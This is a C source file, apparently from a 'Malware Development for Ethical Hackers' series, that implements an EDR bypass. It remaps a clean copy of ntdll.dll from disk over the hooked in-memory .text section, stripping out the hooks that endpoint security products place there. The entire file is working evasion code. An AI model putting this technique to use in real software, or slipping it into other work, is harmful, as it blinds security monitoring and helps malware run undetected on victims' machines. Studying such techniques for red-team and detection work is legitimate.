/*
 * Malware Development for Ethical Hackers
 * hack4.c
 * example of EDR bypass - remapping ntdll
 * author: @cocomelonc
*/
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <stdio.h>

int main() {
  HANDLE hProcess = GetCurrentProcess();
  MODULEINFO moduleInfo = {};
  
  // get the handle and information of the already loaded (hooked) ntdll
  HMODULE hNtdllModule = GetModuleHandleA("ntdll.dll");
  if (hNtdllModule == NULL) return 1;

  GetModuleInformation(hProcess, hNtdllModule, &moduleInfo, sizeof(moduleInfo));
  LPVOID lpNtdllBase = (LPVOID)moduleInfo.lpBaseOfDll;

  // open the clean ntdll.dll file from the system directory
  HANDLE hNtdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
  if (hNtdllFile == INVALID_HANDLE_VALUE) return 1;

  // create a mapping of the clean ntdll file
  HANDLE hNtdllMapping = CreateFileMapping(hNtdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
  if (hNtdllMapping == NULL) {
    CloseHandle(hNtdllFile);
    return 1;
  }

  // map the clean ntdll into our process memory
  LPVOID lpNtdllMappingAddress = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, 0, 0, 0);
  if (lpNtdllMappingAddress == NULL) {
    CloseHandle(hNtdllMapping);
    CloseHandle(hNtdllFile);
    return 1;
  }

  // parse headers to find the .text section
  PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpNtdllBase;
  PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpNtdllBase + pDosHeader->e_lfanew);

  for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtHeaders) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

    // we only care about the .text section where the syscall stubs are located
    if (!strcmp((char*)pSectionHeader->Name, ".text")) {
      DWORD dwOldProtection = 0;
      LPVOID lpAddressToReplace = (LPVOID)((DWORD_PTR)lpNtdllBase + (DWORD_PTR)pSectionHeader->VirtualAddress);
      SIZE_T dwSizeToReplace = pSectionHeader->Misc.VirtualSize;

      // make the hooked .text section writable
      VirtualProtect(lpAddressToReplace, dwSizeToReplace, PAGE_EXECUTE_READWRITE, &dwOldProtection);

      // copy the clean .text section from the mapped file over the hooked section
      memcpy(lpAddressToReplace, (LPVOID)((DWORD_PTR)lpNtdllMappingAddress + (DWORD_PTR)pSectionHeader->VirtualAddress), dwSizeToReplace);

      // restore the original memory protection
      VirtualProtect(lpAddressToReplace, dwSizeToReplace, dwOldProtection, &dwOldProtection);
      
      printf("ntdll .text section successfully remapped. hooks removed!\n");
      break;
    }
  }

  // cleanup
  UnmapViewOfFile(lpNtdllMappingAddress);
  CloseHandle(hNtdllMapping);
  CloseHandle(hNtdllFile);

  return 0;
}